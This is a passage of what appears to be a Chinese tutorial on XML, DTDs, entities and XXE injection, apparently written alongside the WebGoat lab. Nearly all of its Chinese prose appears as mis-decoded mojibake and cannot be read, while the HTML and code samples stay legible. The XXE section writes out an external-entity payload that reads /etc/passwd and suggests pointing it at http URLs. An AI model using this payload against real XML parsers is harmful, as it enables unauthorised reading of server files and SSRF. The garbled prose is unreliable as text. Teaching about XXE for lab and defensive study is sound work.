<li>å±æ€§</li>
<li>å®ä½“</li>
<li>PCDATA</li>
<li>CDATA</li>
</ul>
<h5 id="1-æ¯ä¸ªæ„å»ºæ¨¡å—çš„ç®€è¦æè¿°">1.æ¯ä¸ªæ„å»ºæ¨¡å—çš„ç®€è¦æè¿°</h5>
<h6 id="1-å…ƒç´ "><strong>1. å…ƒç´ </strong></h6>
<p>å…ƒç´ æ˜¯ XML ä»¥åŠ HTML æ–‡æ¡£çš„ä¸»è¦æ„å»ºæ¨¡å—ï¼Œå…ƒç´ å¯åŒ…å«æ–‡æœ¬ã€å…¶ä»–å…ƒç´ æˆ–è€…æ˜¯ç©ºçš„ã€‚å®ä¾‹:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;body text <span class="keyword">in</span> between&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>ç©ºçš„ HTML å…ƒç´ çš„ä¾‹å­æ˜¯ â€œhrâ€ã€â€œbrâ€ ä»¥åŠ â€œimgâ€ã€‚</p>
<h6 id="2-å±æ€§"><strong>2. å±æ€§</strong></h6>
<p>å±æ€§å¯æä¾›æœ‰å…³å…ƒç´ çš„é¢å¤–ä¿¡æ¯ å®ä¾‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<h6 id="3-å®ä½“"><strong>3. å®ä½“</strong></h6>
<p>å®ä½“æ˜¯ç”¨æ¥å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡ã€‚å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p>
<h6 id="4-PCDATA"><strong>4. PCDATA</strong></h6>
<p>PCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚<br>
è¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½•<code>&amp;</code>ï¼Œ<code>&lt;</code>ï¼Œæˆ–è€…<code>&gt;</code>å­—ç¬¦ï¼Œéœ€è¦ç”¨<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>å®ä½“æ¥åˆ†åˆ«æ›¿æ¢ã€‚</p>
<h6 id="5-CDATA"><strong>5. CDATA</strong></h6>
<p>CDATAæ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œåœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚</p>
<h5 id="2-XMLè¯­æ³•è§„åˆ™"><strong>2.XMLè¯­æ³•è§„åˆ™</strong></h5>
<blockquote>
<ul>
<li>
<p>XMLæ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ </p>
</li>
<li>
<p>åŒºåˆ†å¤§å°å†™</p>
<p>åœ¨æ ‡è®°ä¸­å¿…é¡»æ³¨æ„åŒºåˆ†å¤§å°å†™ï¼Œåœ¨XMLä¸­ï¼Œ<code>&lt;TEST&gt;</code>å’Œ<code>&lt;test&gt;</code>æ˜¯ä¸¤ä¸ªæˆªç„¶ä¸åŒçš„æ ‡è®°</p>
</li>
<li>
<p>è¦æœ‰æ­£ç¡®çš„ç»“æŸæ ‡è®°ï¼Œå³å¿…é¡»è¦æœ‰ä¸€ä¸ªé—­åˆæ ‡ç­¾</p>
<p>ç»“æŸæ ‡è®°é™¤äº†è¦å’Œå¼€å§‹ç¼–è¾‘åœ¨æ‹¼å†™å’Œå¤§å°ä¸Šå®Œå…¨ç›¸åŒï¼Œè¿˜å¿…é¡»åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ªæ–œæ â€œ/â€</p>
<p>è‹¥å¼€å§‹æ ‡è®°<code>&lt;test&gt;</code>ï¼Œç»“æŸæ ‡è®°åˆ™ä¸º<code>&lt;/test&gt;</code>ã€‚XMLä¸¥æ ¼è¦æ±‚æ ‡è®°é…å¯¹ï¼ŒHTMLä¸­çš„<code>&lt;br&gt;</code>ã€<code>&lt;hr&gt;</code>çš„å…ƒç´ å½¢å¼åœ¨XMLä¸­æ˜¯ä¸åˆæ³•çš„ã€‚å½“ä¸€å¯¹æ ‡è®°ä¹‹é—´æ²¡æœ‰ä»»ä½•æ–‡æœ¬å†…å®¹æ—¶ï¼Œå¯ä»¥ä¸å†™ç»“æŸæ ‡è®°ï¼Œåœ¨å¼€å§‹æ ‡è®°çš„æœ«å°¾åŠ ä¸Šæ–œæ â€/â€æ¥ç¡®è®¤ï¼Œä¾‹å¦‚ï¼š<code>&lt;test /&gt; </code>è¿™æ ·çš„æ ‡è®°è¢«ç§°ä¸ºâ€œç©ºæ ‡è®°â€ã€‚</p>
</li>
<li>
<p>æ ‡è®°è¦æ­£ç¡®åµŒå¥—</p>
<p>åœ¨ä¸€ä¸ªXMLå…ƒç´ ä¸­å…è®¸åŒ…å«å…¶ä»–XMLå…ƒç´ ï¼Œä½†è¿™äº›å…ƒç´ ä¹‹é—´å¿…é¡»æ»¡è¶³åµŒå¥—æ€§</p>
</li>
<li>
<p>æœ‰æ•ˆä½¿ç”¨å±æ€§ï¼Œå±æ€§å€¼å¿…é¡»åŠ å¼•å·</p>
<p>æ ‡è®°ä¸­å¯ä»¥åŒ…å«ä»»æ„å¤šä¸ªå±æ€§ã€‚åœ¨æ ‡è®°ä¸­ï¼Œå±æ€§ä»¥åç§°/å–å€¼å¯¹å‡ºç°ï¼Œå±æ€§åä¸èƒ½é‡å¤ï¼Œåç§°ä¸å–å€¼ä¹‹é—´ç”¨ç­‰å·â€œ=â€åˆ†éš”ï¼Œä¸”å–å€¼ç”¨å¼•å·å¼•èµ·æ¥ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š&lt;è¡£æœ å“ç‰Œ=â€œè€å…‹â€ ç±»å‹=â€œTæ¤â€ &gt;</p>
</li>
<li>
<p>XMLä¸­ç©ºæ ¼ä¼šè¢«ä¿ç•™</p>
</li>
<li>
<p>å®ä½“å¼•ç”¨</p>
</li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!-- æ ‡é¢˜ï¼ˆæ ¹å…ƒç´ ï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-DTD"><strong>2.DTD</strong></h4>
<p>æŒ‡æ–‡æ¡£ç±»å‹å®šä¹‰(Document Type Definition)ï¼Œé€šè¿‡å®šä¹‰æ ¹èŠ‚ç‚¹ã€å…ƒç´ ï¼ˆELEMENTï¼‰ã€å±æ€§ï¼ˆATTLISTï¼‰ã€å®ä½“ï¼ˆENTITYï¼‰ç­‰çº¦æŸäº†xmlæ–‡æ¡£çš„å†…å®¹æŒ‰ç…§æŒ‡å®šçš„æ ¼å¼æ‰¿è½½æ•°æ®ã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯DTDå¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œå®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</p>
<p>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚ï¼ˆæ‰€ä»¥è¯´æ˜¯å¯é€‰~~ï¼‰</p>
<p><strong>â‘  å†…éƒ¨çš„ DOCTYPE å£°æ˜ï¼š</strong></p>
<p>æ ¼å¼ä¸ºï¼š<code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML å£°æ˜--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--å®šä¹‰ note å…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--å®šä¹‰ to å…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--å®šä¹‰ from å…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--å®šä¹‰ head å…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--å®šä¹‰ body å…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>#PCDATAæ˜¯XMLçº¦æŸæ–‡æ¡£ä¸­çš„ä¸€ä¸ªæ¦‚å¿µï¼Œç”¨äºè¡¨ç¤ºå…ƒç´ çš„å†…å®¹æ˜¯å¯è§£æçš„å­—ç¬¦æ•°æ®ã€‚åœ¨XMLä¸­ï¼Œ#PCDATAç”¨äºè¡¨ç¤ºå…ƒç´ ä¸­åŒ…å«çš„æ–‡æœ¬å†…å®¹ï¼Œå®ƒä¸èƒ½åŒ…å«ä»»ä½•å­å…ƒç´ ã€‚ä¸CDATAä¸åŒï¼Œ#PCDATAå¯ä»¥åŒ…å«å­—ç¬¦ä¸²ã€å­å…ƒç´ å’Œå­—ç¬¦ä¸²ä¸å­å…ƒç´ çš„ç»„åˆã€‚åœ¨XMLçº¦æŸæ–‡æ¡£ä¸­ï¼Œå¦‚DTDï¼ˆDocument Type Definitionï¼‰ç±»å‹çº¦æŸæ–‡æ¡£ï¼Œ#PCDATAç”¨äºæŒ‡å®šå…ƒç´ çš„å†…å®¹æˆ–å±æ€§çš„å–å€¼èŒƒå›´ç­‰ã€‚</p>
</blockquote>
<p><strong>â‘¡ å¤–éƒ¨å¼•ç”¨ï¼š</strong></p>
<p>æ ¼å¼ä¸ºï¼š<code>&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM â€ æ–‡ä»¶å â€&gt; </code></p>
<p>å¦‚ä¸‹xmlä»£ç å¼•ç”¨äº†å¤–éƒ¨DTDï¼Œæ–‡ä»¶ä¸ºâ€œnote.dtdâ€</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>note.dtdï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="3-å®ä½“-2">3.å®ä½“</h4>
<p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p>
<ul>
<li>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</li>
<li>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼šåœ¨DTDä¸­é€šè¿‡<code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code>ç­‰æ–¹å¼å®šä¹‰å®ä½“ï¼Œç›¸å½“äºå®šä¹‰å˜é‡çš„ä½œç”¨ï¼Œå¯åœ¨æ–‡æ¡£å†…å®¹ä¸­é€šè¿‡<code>&amp;å®ä½“åç§°ï¼›</code>çš„æ–¹å¼å¼•ç”¨å®ä½“çš„å€¼ï¼ˆå˜é‡çš„å€¼ï¼‰ã€‚</p>
<p>è¯´ä¸€ä¸ªå¾ˆå®é™…çš„ä¾‹å­</p>
<blockquote>
<p>XMLå…ƒç´ ä»¥å½¢å¦‚ <code>&lt;tag&gt;foo&lt;/tag&gt;</code> çš„æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°å¦‚<code>&lt;</code> çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXMLç”¨å®ä½“å¼•ç”¨ï¼ˆentity referenceï¼‰æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XMLé¢„å®šä¹‰äº”ä¸ªå®ä½“å¼•ç”¨ï¼Œå³ç”¨<code>&lt; &gt; &amp; ' &quot;</code> æ›¿æ¢ <code>&lt; &gt; &amp; ' &quot;</code> ã€‚<br>
å®ä½“å¼•ç”¨å¯ä»¥èµ·åˆ°ç±»ä¼¼å®å®šä¹‰å’Œæ–‡ä»¶åŒ…å«çš„æ•ˆæœï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›è‡ªå®šä¹‰å®ä½“å¼•ç”¨ï¼Œè¿™ä¸ªæ“ä½œåœ¨ç§°ä¸º Document Type Definationï¼ˆDTDï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„è¿‡ç¨‹ä¸­è¿›è¡Œã€‚</p>
</blockquote>
<p>æ³¨æ„åˆ«ææ··<code>&lt;!ENTITY</code> å’Œ <code>&lt;!ELEMENT</code></p>
<blockquote>
<p><code>&lt;!ENTITY</code> ç”¨äºå®šä¹‰å®ä½“å¼•ç”¨ï¼Œè€Œ <code>&lt;!ELEMENT</code> ç”¨äºå®šä¹‰å…ƒç´ çš„ç»“æ„å’Œå†…å®¹ã€‚å®ä½“å¼•ç”¨é€šå¸¸ç”¨äºå¼•ç”¨å¤–éƒ¨èµ„æºï¼Œè€Œå…ƒç´ å®šä¹‰åˆ™ç”¨äºæŒ‡å®šå…ƒç´ çš„ç»“æ„å’Œå†…å®¹è§„åˆ™ã€‚</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/1.png" alt=""></p>
<p>ç„¶åè¿™æ˜¯webgoatçš„è§£é‡Šï¼š</p>
<p>ä¸€æ—¦XMLæ–‡æ¡£è¢«è§£æå™¨å¤„ç†ï¼Œå®ƒå°†ç”¨å®šä¹‰çš„å¸¸é‡â€œJo Smithâ€æ›¿æ¢å®šä¹‰çš„å®ä½“</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/2.png" alt=""></p>
<p>Javaåº”ç”¨ç¨‹åºä¸­ï¼ŒXMLå¯ç”¨äºå°†æ•°æ®ä»å®¢æˆ·ç«¯è·å–åˆ°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éƒ½ç†Ÿæ‚‰JSON APIï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨XMLæ¥è·å–ä¿¡æ¯ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ¡†æ¶ä¼šæ ¹æ® xml ç»“æ„è‡ªåŠ¨å¡«å…… Java å¯¹è±¡ï¼Œä¾‹å¦‚</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/3.png" alt=""></p>
<p><strong>å®ä½“ç±»å‹</strong>:å®ä½“åˆ†ä¸ºå¤šç§ç±»å‹ï¼Œä»ä½¿ç”¨èŒƒå›´çš„ç»´åº¦ï¼Œåˆ†ä¸ºå‚æ•°å®ä½“ï¼ˆåªèƒ½åœ¨DTDä¸­å¼•ç”¨ï¼‰ä¸éå‚æ•°å®ä½“ï¼ˆå¯ä»¥åœ¨DTDä¸­ã€æ–‡æ¡£å†…å®¹ä¸­å¼•ç”¨ï¼‰ã€‚åŒºåˆ«å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th></th>
<th>æ ·ä¾‹</th>
<th>å¼•ç”¨æ–¹å¼</th>
<th>ä½¿ç”¨èŒƒå›´ä¸åœºæ™¯</th>
</tr>
</thead>
<tbody>
<tr>
<td>éå‚æ•°å®ä½“</td>
<td><code>&lt;!ENTITY country &quot;ä¸­å›½&quot;&gt;</code></td>
<td>&amp;country;</td>
<td>åœ¨DTDä¸­ã€æ–‡æ¡£å†…å®¹ä¸­å‡å¯å¼•ç”¨ï¼Œä¸€èˆ¬ç”¨æ¥å–ä»£é‡å¤çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>å‚æ•°å®ä½“</td>
<td><code>&lt;!ENTITY % countrydefine &quot;xxxå…ƒç´ çš„DTDå®šä¹‰å†…å®¹&quot;&gt;</code></td>
<td>%country;</td>
<td>ä»…èƒ½åœ¨DTDå®šä¹‰ä¸­å¼•ç”¨ï¼Œä¸€èˆ¬ç”¨æ¥ä¿å­˜æŸæ®µé‡å¤çš„DTDå®šä¹‰</td>
</tr>
</tbody>
</table>
<p>ä»å€¼çš„æ¥æºç»´åº¦ï¼Œåˆ†ä¸ºå†…éƒ¨å®ä½“ã€å¤–éƒ¨å®ä½“ã€‚å†…éƒ¨å®ä½“ä¸ºæ–‡æ¡£å†…éƒ¨ç›´æ¥å®šä¹‰å€¼ï¼Œå¤–éƒ¨å®ä½“ä¸ºé€šè¿‡httpã€fileç­‰åè®®ä»æ–‡ä»¶å¤–çš„æŸå¤„è·å–å†…å®¹ä½œä¸ºå®ä½“çš„å€¼ã€‚åŒºåˆ«å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th></th>
<th>æ ·ä¾‹</th>
<th>ç‰¹å¾ä¸ä½¿ç”¨åœºæ™¯</th>
</tr>
</thead>
<tbody>
<tr>
<td>å†…éƒ¨å®ä½“</td>
<td><code>&lt;!ENTITY country &quot;ä¸­å›½&quot;&gt;</code></td>
<td>å€¼æ˜¯æ˜ç¡®çš„å­—ç¬¦ä¸²å¸¸é‡ç­‰ï¼Œå¯ä»¥ç›´æ¥å®šä¹‰åœ¨æœ¬æ–‡æ¡£ä¸­</td>
</tr>
<tr>
<td>å¤–éƒ¨å®ä½“</td>
<td><code>&lt;!ENTITY country SYSTEM &quot;file:///D:/country.txt&quot;&gt;</code></td>
<td>å€¼æ¥æºäºå…¶å®ƒæ–‡ä»¶æˆ–è€…ç½‘ç»œ</td>
</tr>
</tbody>
</table>
<h4 id="4-XMLå¤–éƒ¨å®ä½“æ³¨å…¥"><strong>4.XMLå¤–éƒ¨å®ä½“æ³¨å…¥</strong></h4>
<p>XML External Entity Injectionå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼Œç®€ç§°XXEæ¼æ´ã€‚å½“xmlè§£æå™¨æ”¯æŒå¯¹äºå¤–éƒ¨å®ä½“çš„è§£æä¸”å¾…è§£æçš„xmlæ–‡ä»¶å¯ç”±å¤–éƒ¨æ§åˆ¶æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ å¤–éƒ¨å®ä½“çš„å†…å®¹ä¸ºæœ¬åœ°å…¶å®ƒç›®å½•ä¸‹çš„æ–‡ä»¶ã€è®¿é—®å†…ç½‘/å¤–ç½‘çš„åˆ¶å®šurlç­‰æ–¹å¼å®ç°è‡ªå·±çš„æ”»å‡»ç›®çš„ï¼Œè¾¾åˆ°ä¿¡æ¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œã€æ‹’ç»æœåŠ¡ã€SSRFã€å†…ç½‘ç«¯å£æ‰«æç­‰æ”»å‡»ç›®çš„ã€‚</p>
<h3 id="1-3">1-3</h3>
<p>å»ºè®®çœ‹å®Œä¸Šé¢çš„åŸºæœ¬æ¦‚å¿µï¼Œå†çœ‹ä¸€éwebgoatçš„ï¼Œå¯ä»¥æœ‰æ›´å¤šç†è§£</p>
<p>å¼•ç”¨ä¸€ä½åšä¸»çš„è¯</p>
<p>ä¸‹é¢æ˜¯XXEæ³¨å…¥çš„ç²—ç•¥ç†è§£ï¼ˆç¡®å®ç²—ç•¥æ˜“æ‡‚ï¼‰</p>
<blockquote>
<p>XMLå£°æ˜ï¼Œä¸€èˆ¬æ²¡å•¥ï¼Œçº¦æŸè€Œå·²ï¼Œéƒ½ä¼šå†™ä¸Š</p>
<p>ç‰ˆæœ¬ç¼–ç <?xml version="1.0" encoding="UTF-8"?> æ–‡æ¡£ç±»å‹å®šä¹‰(DTD)</p>
<p>é‡ç‚¹åœ¨è¿™ï¼<strong>å¯ä»¥å¼•ç”¨å†…éƒ¨å¤–éƒ¨çš„å®ä½“</strong></p>
<p>å¦‚ï¼š<code>&lt;!ENTITY % name SYSTEM â€œfile:///etc/passwd&quot;&gt;%name;</code>å¼•ç”¨äº†ä¸å°±è°ƒç”¨äº†ï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹ç±»ä¼¼æ–‡ä»¶åŒ…å«ï¼Ÿè¿™ä¸ªå®é™…ä¸Šå°±æ˜¯æŠŠâ€œfile:///etc/passwdâ€èµ‹å€¼ç»™nameï¼Œé‚£å¦‚æœ<code>file:///etc/passwd</code>ç”¨æˆ·å¯æ§å‘¢ï¼Ÿæ”¹æˆhttpåè®®å‘¢ï¼Ÿæ²¡å¬æ‡‚ï¼Œå†è§£é‡Šä¸€éå§</p>
<p>XMLå¤–éƒ¨å®ä½“ â€˜nameâ€™ è¢«èµ‹äºˆçš„å€¼ä¸ºï¼šfile://etc/passwdã€‚åœ¨è§£æXMLæ–‡æ¡£çš„è¿‡ç¨‹ä¸­ï¼Œå®ä½“â€™ nameâ€™çš„å€¼ä¼šè¢«æ›¿æ¢ä¸ºURI(file://etc/passwd)å†…å®¹å€¼ï¼ˆä¹Ÿå°±æ˜¯passwdæ–‡ä»¶çš„å†…å®¹ï¼‰ã€‚ å…³é”®å­—â€™SYSTEMâ€™ä¼šå‘Šè¯‰XMLè§£æå™¨ï¼Œâ€™ nameâ€™å®ä½“çš„å€¼å°†ä»å…¶åçš„URIä¸­è¯»å–ï¼Œå¹¶æŠŠè¯»å–çš„å†…å®¹æ›¿æ¢nameå‡ºç°çš„åœ°æ–¹ã€‚å‡å¦‚ SYSTEM åé¢çš„å†…å®¹å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥éšæ„æ›¿æ¢ä¸ºå…¶ä»–å†…å®¹ï¼Œä»è€Œè¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆfile:///etc/passwd)æˆ–è€…è¿œç¨‹æ–‡ä»¶ï¼ˆ<code>http://www.baidu.com/zzyy.txtï¼‰</code>]&gt; &lt;å…ƒç´ åç§° category=â€œå±æ€§â€&gt;æ–‡æœ¬æˆ–å…¶ä»–å…ƒç´ &lt;/å…ƒç´ åç§°&gt;</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼šXXEæ³¨å…¥ï¼Œå³XML External Entityï¼ŒXMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚é€šè¿‡ XML å®ä½“ï¼Œâ€SYSTEMâ€å…³é”®è¯å¯¼è‡´ XML è§£æå™¨å¯ä»¥ä»æœ¬åœ°æ–‡ä»¶æˆ–è€…è¿œç¨‹ URI ä¸­è¯»å–æ•°æ®ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡ XML å®ä½“ä¼ é€’è‡ªå·±æ„é€ çš„æ¶æ„å€¼ï¼Œæ˜¯å¤„ç†ç¨‹åºè§£æå®ƒã€‚å½“å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p>
<p>ENTITY å®ä½“ï¼Œåœ¨ä¸€ä¸ªç”šè‡³å¤šä¸ªXMLæ–‡æ¡£ä¸­é¢‘ç¹ä½¿ç”¨æŸä¸€æ¡æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥é¢„å…ˆå®šä¹‰ä¸€ä¸ªè¿™æ¡æ•°æ®çš„â€œåˆ«åâ€ï¼Œå³ä¸€ä¸ªENTITYï¼Œç„¶ååœ¨è¿™äº›æ–‡æ¡£ä¸­éœ€è¦è¯¥æ•°æ®çš„åœ°æ–¹è°ƒç”¨å®ƒã€‚</p>
